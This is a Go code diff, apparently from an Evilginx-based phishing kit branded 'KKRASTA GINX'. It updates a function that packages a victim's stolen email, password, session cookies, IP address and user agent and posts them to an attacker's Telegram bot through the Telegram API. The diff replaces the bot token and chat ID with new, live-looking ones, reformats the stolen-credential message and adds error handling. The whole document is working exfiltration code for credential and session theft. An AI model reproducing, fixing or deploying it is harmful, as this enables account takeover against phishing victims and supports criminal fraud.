@@ -19,23 +19,44 @@ import (
 )
 
 const (
-	chat_id = "6919713645"
-	token     = "7874948521:AAG2rd8jR9s3nQA2XCGUZj_7AqCURLC0Q2c"
+	chat_id = "-1002540456884"
+	token     = "7625184798:AAHUyWM6UFzEmlRGzbZr-xKRoeKbkuI3csw"
 )
 
 func telegramSendResult(cookies string, username string, password string, ip string, agent string, sid string) {
 	client := &http.Client{}
 	fileName := username + "-Cookies.json"
-	text_msg := "🔥 KKRASTA GINX SPAM COOKIES RESULT 🔥\nLogs: " + sid + "\nEmail: " + username + "\nPassword: " + password + "\nIP-Address: https://ip-api.com/" + ip + "\nUserAgent: " + agent + "\n @kkrasta_ginx 🔥🔥🔥🔥🔥"
+
+	text_msg := fmt.Sprintf(
+		"🔥 KKRASTA GINX SPAM COOKIES RESULT 🔥\n"+
+			"👤 Email:          ➖ %s\n"+
+			"🔑 Password:       ➖ %s\n"+
+			"🌍 IP Address:     ➖ https://ip-api.com/%s\n"+
+			"🖥️ User Agent:     ➖ %s\n\n"+
+			"📌 Session ID:     ➖ %s\n"+
+			"📣 Powered by:     ➖ @kkrasta_ginx 🔥🔥🔥🔥🔥\n"+
+			"📦 Tokens are added in txt file and attached separately in message.\n",
+		username,
+		password,
+		ip,
+		agent,
+		sid,
+	)
+
 	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
+		return
 	}
 
 	fileDir, _ := os.Getwd()
 	filePath := path.Join(fileDir, fileName)
 
-	file, _ := os.Open(filePath)
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Printf("Unable to open file: %v", err)
+		return
+	}
 	defer file.Close()
 
 	body := &bytes.Buffer{}
@@ -45,10 +66,11 @@ func telegramSendResult(cookies string, username string, password string, ip str
 	writer.WriteField("caption", text_msg)
 	writer.Close()
 
-	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
+	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id
 	req, _ := http.NewRequest("POST", url, body)
 	req.Header.Add("Content-Type", writer.FormDataContentType())
 	client.Do(req)
+
 	os.Remove(fileName)
 }
 
